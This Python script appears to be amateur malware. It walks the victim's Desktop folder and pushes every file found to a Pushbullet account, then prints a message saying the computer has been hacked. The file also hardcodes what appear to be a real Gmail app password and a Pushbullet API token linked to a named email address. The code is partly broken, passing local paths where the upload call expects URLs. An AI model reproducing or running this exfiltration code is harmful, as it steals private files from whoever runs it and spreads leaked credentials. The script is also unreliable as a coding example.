import os
import pushbullet as p
google_p = { "password" : "evss eyxz vjng vplm","API_key(rouhinroy09@gmail.com)" : "o.8jQVlhw8dp3KRvjJVddtXMfLBaIEcvyq"}
pb = p.PushBullet(google_p["API_key(rouhinroy09@gmail.com)"])
def print_file_paths(directory):
    for dirpath, _, filenames in os.walk(directory):
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            file_name_ = file_path.split("\\")[int(len(file_path.split("\\"))) - 1]
            file = file_path.split("\\")[int(len(file_path.split("\\"))) - 1]
            pb.push_file(file_name= file_path.split("\\")[int(len(file_path.split("\\"))) - 1], file_url= file_path, file_type= file.split(".")[1])
    print("Your computer has succesfully been hacked")          
# Provide the root directory of your PC
root_directory = os.getcwd() # Change this to the appropriate root directory of your PC
root_directory = root_directory.replace("Downloads","Desktop")
print_file_paths(root_directory)
